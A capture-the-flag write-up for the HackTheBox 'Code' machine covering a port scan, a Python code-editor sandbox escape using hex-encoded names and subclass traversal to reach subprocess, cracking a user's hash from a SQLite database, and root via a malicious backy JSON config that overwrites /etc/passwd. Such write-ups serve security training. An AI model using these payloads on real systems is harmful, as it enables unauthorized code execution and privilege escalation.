------------

### CTF: HTB
### LAB-: CODE

------------

![image](https://github.com/user-attachments/assets/11a36ca9-469e-46d2-a2a3-8833e969b8bd)

-------------

- Rustscan's output-:

```bash
❯ rustscan -a code.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.62:22
Open 10.10.11.62:5000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-25 08:51 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:51
Completed NSE at 08:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:51
Completed NSE at 08:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:51
Completed NSE at 08:51, 0.00s elapsed
Initiating Connect Scan at 08:51
Scanning code.htb (10.10.11.62) [2 ports]
Discovered open port 5000/tcp on 10.10.11.62
Discovered open port 22/tcp on 10.10.11.62
Completed Connect Scan at 08:51, 2.21s elapsed (2 total ports)
Initiating Service scan at 08:51
Scanning 2 services on code.htb (10.10.11.62)
Completed Service scan at 08:51, 7.96s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.62.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:51
Completed NSE at 08:52, 7.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:52
Completed NSE at 08:52, 1.25s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:52
Completed NSE at 08:52, 0.00s elapsed
Nmap scan report for code.htb (10.10.11.62)
Host is up, received user-set (0.21s latency).
Scanned at 2025-03-25 08:51:48 WAT for 18s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
5000/tcp open  http    syn-ack Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- A web server is running on `port 5000` which is hosting a flask code editor for python.

![image](https://github.com/user-attachments/assets/e567ba14-c06c-44b1-a173-47fdc1a965c0)

- I tried to import a module but it got filtered.

![image](https://github.com/user-attachments/assets/a2dc2ab8-f1ad-433c-9a39-fd23f5da4cc7)

- After interacting with it for a while,I noticed that the characters below are being filtered.

```
os
system
subprocess
__import__
__builtins__
eval
exec
Popen
```
- To disguise the filtered characters, I encoded them with hex, so I'll later decode with `bytes` which is one python's inbuilt modules and don't need to the imported.

![image](https://github.com/user-attachments/assets/c6a02556-cd22-4bea-b543-e47d9dd24165)

- To gain RCE without,we'll try to find `__builtins__` by accessing it through `__init__`.`__builtins__` contains builtin function in python.
- I accessed subclasses with `x.__class__.__base__.__subclasses__`.

![image](https://github.com/user-attachments/assets/6a3d812e-e4a5-454d-8fed-e210372ac401)

- It is a list,we can call a class based on its index value.The class at index `100` allows me to access `__builtins__`.Now,we can access `import` and call subprocess.

![image](https://github.com/user-attachments/assets/9e0f3165-fe5c-40e7-b156-a1ffaeff123a)

- I used check_output to execute a shell command because the common ones `Popen` and `call` are being filtered.

![image](https://github.com/user-attachments/assets/23a94274-d026-4d40-b637-2e0eef9dab56)

- Full Poc-:

```python3
x = bytes.fromhex("5f5f6275696c74696e735f5f").decode()
y = bytes.fromhex("5f5f696d706f72745f5f").decode()
z = bytes.fromhex("73756270726f63657373").decode()
print(x.__class__.__base__.__subclasses__()[100].__init__.__globals__[x][y](z).check_output('ls',shell=True,text=False))
```

- Revshell as user `app`-:

![image](https://github.com/user-attachments/assets/fde54fa1-72d4-4f94-9453-7d97d5bfd76d)

----------------

### User Martin

-----------------

- I went through the backend of the code editor app, I noticed it runs on a sqlite db.

![image](https://github.com/user-attachments/assets/08a0ef92-7c04-4bf5-a3e2-1a3f72f653bb)

- I opened it with the `sqlite3` commandline and discovered hashes in the table `user` for user `developer` and `martin`.

![image](https://github.com/user-attachments/assets/5fb913e7-2864-401b-b149-7a4ddb5924fc)

- I cracked Martin's hash with crackstation.net.

![image](https://github.com/user-attachments/assets/068b5774-c5fe-4ab1-9ed0-b18c22af4a4b)

- User Martin-:

![image](https://github.com/user-attachments/assets/85a21af4-9395-47b2-9cea-159eedd15603)

----------------

### PRIVILEGE ESCALATION- :BACKY GO TOOL ARBITRARY FILE WRITE

----------------

- I ran `sudo -l` and discovered that user `martin` can run a script

![image](https://github.com/user-attachments/assets/40332400-b729-445f-b97e-0cfec3f4dbd0)

- I dived into the script and discovered that it runs a binary `backy`.

![image](https://github.com/user-attachments/assets/0ca2b7bb-b6b7-47c4-9aea-6af9c13d6c96)

- I ran strings and discovered the repo for the `backy` tool.

![image](https://github.com/user-attachments/assets/56c4a08f-261f-4022-91e9-d530337b0761)

- The tool has another functionality which is syncing directories with another directory with `Rsync`.This functionality also allows us to copy files and most importantly `overwrite the target file`.We can overwrite `/etc/passwd` and create a user with root privileges.

![image](https://github.com/user-attachments/assets/6a99610d-1761-41f2-b4fa-6c536130b673)

- Creating a passwd with a malicious user-:

![image](https://github.com/user-attachments/assets/64d4e86d-68db-49d2-b5d7-d1f0e9fee1e7)

- Then, our malicious json POC-:

```json
{
        "destination": "/etc/passwd",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/martin"
        ],
          "directories_to_sync": [
             "passwd"
        ],
        "exclude": [
                ".*"
        ]
}
```

- Transfer it into the target directory
- Now,run the backy script with the poc json file-:

![image](https://github.com/user-attachments/assets/5f592233-497d-4e2d-bc7d-6129e08eb23c)

- Root-:

![image](https://github.com/user-attachments/assets/3a8dc094-d3ec-4621-99f2-aadba3357ff6)

--------------

### THANKS FOR READING

---------------











